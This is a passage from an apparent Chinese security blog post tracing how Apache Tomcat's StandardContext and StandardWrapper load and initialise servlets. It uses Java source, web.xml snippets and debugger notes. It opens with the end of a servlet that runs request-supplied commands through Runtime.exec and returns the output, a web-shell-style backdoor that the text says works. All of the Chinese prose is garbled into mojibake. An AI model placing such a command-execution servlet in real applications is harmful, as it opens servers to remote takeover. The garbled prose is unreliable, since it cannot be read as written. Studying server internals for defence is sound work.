</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmds</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">in</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\a&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">output</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getServletInfo</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰§è¡Œä¸€ä¸‹å¯ä»¥æˆåŠŸè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055834.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240902145647422"
	
	
></p>
<p>è¿™é‡Œçš„ç»§æ‰¿å…³ç³»ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Interface Servlet, ServletConfig
</span></span><span class="line"><span class="cl">â†“
</span></span><span class="line"><span class="cl">abstract class GenericServlet
</span></span><span class="line"><span class="cl">â†“
</span></span><span class="line"><span class="cl">class HttpServlet
</span></span><span class="line"><span class="cl">â†“
</span></span><span class="line"><span class="cl">è‡ªå®šä¹‰ Servlet
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="è°ƒè¯•åˆ†æ">è°ƒè¯•åˆ†æ
</h5><p>ï¼ˆ<u>è¿™é‡Œæ”¹æˆäº†mavené¡¹ç›®æ¥å­¦ä¹ ï¼Œå°†.classæ–‡ä»¶æ”¹ä¸ºäº†.javaæ–‡ä»¶</u>ï¼‰</p>
<h6 id="è°ƒè¯•åˆ†æservletçš„åŠ è½½è¿‡ç¨‹">è°ƒè¯•åˆ†æservletçš„åŠ è½½è¿‡ç¨‹
</h6><p>åœ¨<code>org.apache.catalins.core.StandardContext</code>ç±»çš„<code>startInternal()</code>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆè°ƒç”¨äº†<code>listenerStart()</code>ï¼Œæ¥ç€æ˜¯<code>filterStart()</code>ï¼Œæœ€åæ˜¯<code>loadOnstartup()</code>ã€‚è¿™ä¸‰å¤„è°ƒç”¨è§¦å‘äº†Listenerã€Filterã€Servletçš„æ„é€ åŠ è½½ã€‚</p>
<p>è¿™é‡Œä¸»è¦åˆ†æServletçš„åŠ è½½ï¼Œç°åœ¨æ‰“æ–­ç‚¹äºloadOnstartup()æ–¹æ³•</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055664.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903122950573"
	
	
></p>
<p>å‰é¢ä¹Ÿè¯´è¿‡äº†ï¼Œåœ¨Containerä¸­çš„å››ä¸ªå®¹å™¨æ˜¯å­˜åœ¨çˆ¶å­å…³ç³»çš„ï¼Œè€ŒStandardContextæ˜¯Contextçš„å®ç°ç±»ï¼Œæ‰€ä»¥è¿™é‡Œå¾ˆæœ‰å¯èƒ½è¿™é‡Œçš„findChildren()æ–¹æ³•å°±æ˜¯å¯»æ‰¾wrapperï¼Œä¹Ÿå°±æ˜¯Sevletã€‚è¿›å…¥è¿™ä¸ªfindChildren()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055388.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903123019133"
	
	
></p>
<p>è¿›å…¥åˆ°äº†StandardContextç±»çš„çˆ¶ç±»ContainerBaseç±»ï¼Œchildrenå˜é‡çš„å®šä¹‰ä¸ºï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055084.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903123114084"
	
	
></p>
<p>childrenæ˜¯ä¸€ä¸ªHashMapç±»å®ä¾‹ï¼Œè¿™é‡Œè°ƒç”¨HashMapç±»çš„values()æ–¹æ³•ç”¨æ¥è·å–åˆ°HashMapä¸­çš„valueçš„é›†åˆã€‚çœ‹ä¸€ä¸‹è¿™é‡Œçš„è¾“å‡ºç»“æœï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055477.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903123307699"
	
	
></p>
<p>è¿™é‡Œæœ‰ä¸‰ä¸ªï¼Œä¸€ä¸ªdefaultå’ŒJSPï¼Œåº”è¯¥éƒ½æ˜¯è‡ªå¸¦çš„ï¼Œåœ¨è¿™é‡Œè¿˜å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„ServletTestï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šè¿™é‡Œçš„childrenå°±æ˜¯å­˜å‚¨Servletçš„åœ°æ–¹ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œçš„<strong>findChildren()æ–¹æ³•å°±æ˜¯è·å–åˆ°Servletçš„Containerç±»å‹çš„æ•°ç»„å¹¶è¿”å›</strong>ã€‚</p>
<p>â€”â€”â€”â€”</p>
<p>å†å›åˆ°loadOnStartup()æ–¹æ³•ï¼Œæ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">loadOnStartup</span><span class="p">(</span><span class="n">Container</span><span class="w"> </span><span class="n">children</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Collect &#34;load on startup&#34; servlets that need to be initialized</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TreeMap</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TreeMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Container</span><span class="w"> </span><span class="n">child</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">children</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Wrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Wrapper</span><span class="p">)</span><span class="w"> </span><span class="n">child</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">loadOnStartup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">wrapper</span><span class="p">.</span><span class="na">getLoadOnStartup</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">loadOnStartup</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">continue</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Integer</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">loadOnStartup</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">map</span><span class="p">.</span><span class="na">computeIfAbsent</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">()).</span><span class="na">add</span><span class="p">(</span><span class="n">wrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Load the collected &#34;load on startup&#34; servlets</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">values</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Wrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">load</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ServletException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">getLogger</span><span class="p">().</span><span class="na">error</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">sm</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;standardContext.loadOnStartup.loadException&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">getName</span><span class="p">(),</span><span class="w"> </span><span class="n">wrapper</span><span class="p">.</span><span class="na">getName</span><span class="p">()),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">StandardWrapper</span><span class="p">.</span><span class="na">getRootCause</span><span class="p">(</span><span class="n">e</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// NOTE: load errors (including a servlet that throws</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// UnavailableException from the init() method) are NOT</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// fatal to application startup</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// unless failCtxIfServletStartFails=&#34;true&#34; is specified</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getComputedFailCtxIfServletStartFails</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>é€šè¯»ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½çœ‹æ‡‚çš„ï¼š</p>
<ul>
<li>å…ˆå®šä¹‰ä¸€ä¸ªTreeMapç±»ï¼Œç„¶åä½¿ç”¨forå¾ªç¯éå†ä¼ å…¥çš„childrenå˜é‡ï¼Œç„¶åå¯¹å¯¹è±¡è°ƒç”¨getLoadOnStartup()æ–¹æ³•ï¼š</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055482.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903130437831"
	
	
></p>
<p>ä¹Ÿå°±æ˜¯ç›´æ¥è¿”å›loadOnStartupï¼Œå¦‚æœloadOnStartup &lt; 0ï¼Œå°±ä¼šç›´æ¥è¿›è¡Œä¸‹ä¸€ä¸ªforå¾ªç¯ï¼Œé‚£ä¹ˆè¿™é‡Œçš„loadOnstartupæ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>å…¶å®å°±æ˜¯StandardWrapperç±»çš„ä¸€ä¸ªå˜é‡ï¼Œ<strong>å½“æ˜¯ä¸€ä¸ªè´Ÿæ•°æˆ–è€…æ²¡æœ‰æŒ‡å®šæ—¶ï¼Œåˆ™è¡¨ç¤ºæœåŠ¡å™¨åœ¨è¯¥servletè¢«è°ƒç”¨æ—¶æ‰åŠ è½½</strong>ï¼Œæˆ‘ä»¬ç‚¹å¼€è¿™é‡Œçš„childrenï¼š</p>
<p>åœ¨æœåŠ¡å™¨è‡ªå¸¦çš„servletä¸­ä¸ºï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055704.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903125643619"
	
	
></p>
<p>åœ¨æˆ‘è‡ªå®šä¹‰çš„Servletä¸­ä¸ºï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055738.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903125603936"
	
	
></p>
<p>å¯ä»¥çœ‹å‡ºå¦‚æœæ˜¯æˆ‘è‡ªå®šä¹‰çš„servletï¼Œé‚£ä¹ˆæ˜¯è‚¯å®šä¸ä¼šè¢«åŠ è½½çš„ã€‚ä½†æ˜¯è¿™é‡Œçš„loadOnStartupå…¶å®æ˜¯ web.xml é…ç½® Servlet æ—¶çš„ä¸€ä¸ªé…ç½®ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¹¶ä¸”åœ¨StandardWrapperç±»ä¸­è¿˜æœ‰ä¸ªè®¾ç½®loadOnStartupå€¼çš„æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055758.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903130737807"
	
	
></p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”</p>
<ul>
<li>ç„¶åå›åˆ°loadOnStartup()æ–¹æ³•ï¼š</li>
</ul>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055895.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903131357513"
	
	
></p>
<p>å¦‚æœæ¡ä»¶å…è®¸ï¼Œåˆ™ä¼šå°†è¿™ä¸ªwrapperæ”¾å…¥åˆ°ä¸€ä¸ªArrayListå‹çš„mapï¼Œå†ç„¶ååˆè°ƒç”¨forå¾ªç¯éå†è¿™ä¸ªmapå¹¶è°ƒç”¨load()æ–¹æ³•åŠ è½½ã€‚</p>
<p>ç»§ç»­è·Ÿè¿›è¿™ä¸ªload()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055096.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903132319618"
	
	
></p>
<p>è¿™é‡Œè°ƒç”¨äº†loadServlet()æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055136.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903133237852"
	
	
></p>
<p>é‡ç‚¹å°±æ˜¯æˆ‘æ ‡æ³¨å‡ºæ¥çš„ä¸œè¥¿ï¼Œè¿™é‡Œé€šè¿‡<strong>servletClasså˜é‡æ¥è£…è½½servlet</strong>ï¼Œå¹¶ä¸”è¿™ä¸ªæ–¹æ³•æœ€åå°±æ˜¯è¿”å›è¿™ä¸ªservletã€‚</p>
<p>ç»§ç»­åˆ†æè¿™ä¸ªloadServlet()åç»­ä»£ç ï¼š</p>
<p>åœ¨åé¢è¿˜æ‰§è¡Œäº†ä¸€æ¬¡åˆå§‹åŒ–æ“ä½œï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055288.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903152933417"
	
	
></p>
<p>æ³¨æ„è¿™é‡Œå°†è£…è½½åçš„servletä¼ è¿›å»äº†ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªinitServlet()æ–¹æ³•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055284.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903160859192"
	
	
></p>
<p><strong>ä¼šè°ƒç”¨servletçš„init()æ–¹æ³•</strong>ï¼Œåœ¨è¿™é‡Œå°±æ˜¯è‡ªå¸¦çš„DefaultServletç±»çš„init()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055314.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903161500123"
	
	
></p>
<p>å®Œæˆåˆå§‹åŒ–æ“ä½œã€‚åŒæ ·çš„å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰çš„ServletTestå¯ä»¥æ»¡è¶³loadOnStartup&gt;=0ï¼Œé‚£ä¹ˆåŒæ ·çš„ä¼šè°ƒç”¨åˆ°è¿™ä¸ªinit()æ–¹æ³•ç”¨äºåˆå§‹åŒ–è¿™ä¸ªservletã€‚è‡ªå·±è¯•äº†ä¸€ä¸‹ï¼Œweb.xmlæ”¹ä¸ºå¦‚ä¸‹å³å¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;servlet&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-name&gt;</span>ServletTest<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-class&gt;</span>Servlet.ServletTest<span class="nt">&lt;/servlet-class&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/servlet&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-name&gt;</span>ServletTest<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;url-pattern&gt;</span>/servlet<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/servlet-mapping&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥è‡ªå·±è°ƒè°ƒï¼Œäº²æµ‹å¯è¡Œã€‚</p>
<p>â€”â€”â€”â€”</p>
<p>åœ¨è°ƒç”¨å®Œinit()æ–¹æ³•åï¼Œè¿˜æœ‰ä¸ªç‚¹è¯´æ˜ä¸€ä¸‹ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055449.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903161818402"
	
	
></p>
<p>åé¢è¿˜æœ‰ä¸€ä¸ªå°†è¿™ä¸ªinstanceInitializedèµ‹å€¼ä¸ºtrueçš„è¯­å¥ã€‚åœ¨å‰é¢è¿™é‡Œçš„Wrapperçš„è¿™ä¸ªå€¼éƒ½æ˜¯falseï¼Œåªæœ‰è¿™é‡Œæ‰ä¼šå°†å…¶æ”¹ä¸ºtrue</p>
<p>â€”â€”â€”â€”</p>
<p>ç„¶åç»§ç»­å›åˆ°load()æ–¹æ³•ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055664.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903143729676"
	
	
></p>
<p>è°ƒè¯•äº†ä¸€ä¸‹</p>
<ul>
<li><strong>ç¬¬ä¸€ä¸ªifæ¡ä»¶</strong>ï¼Œä¸ä¼šè¿›å…¥ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ä¸Šé¢æ‰è¯´æ˜çš„ï¼Œæœ‰ä¸€ä¸²ä»£ç å¯¹å…¶èµ‹å€¼ï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055787.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903151529989"
	
	
></li>
</ul>
<p>æ‰€ä»¥ç¬¬ä¸€ä¸ªifè¯­å¥æ˜¯ä¸ä¼šè¿›å…¥çš„</p>
<ul>
<li><strong>ç¬¬äºŒä¸ªifæ¡ä»¶</strong>ä¸­çš„isJspServletå°±æ˜¯åˆ¤æ–­æ˜¯ä¸æ˜¯æœåŠ¡å™¨è‡ªå¸¦çš„JSPServletï¼Œä¸æ˜¯å°±ä¸ä¼šè¿›å…¥ã€‚</li>
</ul>
<p>OKï¼ŒservletåŠ è½½è¿‡ç¨‹åˆ†æå®Œæ¯•ã€‚</p>
<p>åœ¨ä¸Šé¢æåˆ°äº†å‡ ä¸ªé‡è¦çš„ç‚¹ï¼š</p>
<ul>
<li></li>
<li>
<p>åœ¨StardardContextè°ƒç”¨findChildren()è·å–åˆ°Containter[]ï¼Œç„¶åforå¾ªç¯éå†å¾—åˆ°wrapperï¼Œå¹¶å¯¹å…¶è¿›è¡Œload()æ“ä½œ</p>
</li>
<li>
<p>åœ¨load()æ“ä½œä¸­ï¼Œæœ‰ä¸¤ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼Œä¸€ä¸ªæ˜¯è¿™ä¸ªwrapperçš„loadOnStartupéœ€è¦&gt;=0</p>
</li>
<li>
<p>è¿˜æœ‰ä¸ªç‚¹å°±æ˜¯åˆ©ç”¨åˆ°äº†servletClassï¼Œä½¿ç”¨è¿™ä¸ªæ–¹æ³•è·å–åˆ°äº†ç›¸å¯¹åº”çš„Servletç±»</p>
</li>
</ul>
<p>â€”â€”â€”â€”â€”â€”</p>
<h6 id="è°ƒè¯•åˆ†æservletçš„åˆå§‹åŒ–è¿‡ç¨‹">è°ƒè¯•åˆ†æservletçš„åˆå§‹åŒ–è¿‡ç¨‹
</h6><p>åœ¨å‰é¢å…¶å®è¯´æ˜äº†æ¯”å¦‚è¦ç”¨åˆ°loadOnStartupã€servletClassç­‰å˜é‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¯´åˆ°æ€ä¹ˆå¯¹è¿™äº›å˜é‡è¿›è¡Œèµ‹å€¼ã€‚è¿™ä¸ªæ¿å—ä¸»è¦å°±æ˜¯ç”¨äºè§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>åœ¨ StandardWrapper#setServletClass() æ–¹æ³•å¤„ä¸‹æ–­ç‚¹ï¼Œå¼€å§‹è°ƒè¯•ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055865.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903185901178"
	
	
></p>
<p>å¯ä»¥çœ‹å‡ºåœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶è¿˜æ˜¯å…ˆåˆå§‹åŒ–çš„è‡ªå¸¦çš„DefaultServletï¼Œæ­¤æ—¶çš„éƒ¨åˆ†è°ƒç”¨æ ˆï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055828.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903190017339"
	
	
></p>
<p>æˆ‘ä»¬å›æº¯åˆ°ContextConfig#configureContext()æ–¹æ³•ï¼Œç®€å•çœ‹çœ‹ï¼ŒåŸºæœ¬å¯ä»¥çœ‹å‡ºå°±æ˜¯åœ¨è¯»å–web.xmlä¸­çš„æ•°æ®ï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055927.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903190616385"
	
	
></p>
<p>è¿™é‡Œçš„contextå®šä¹‰ï¼š
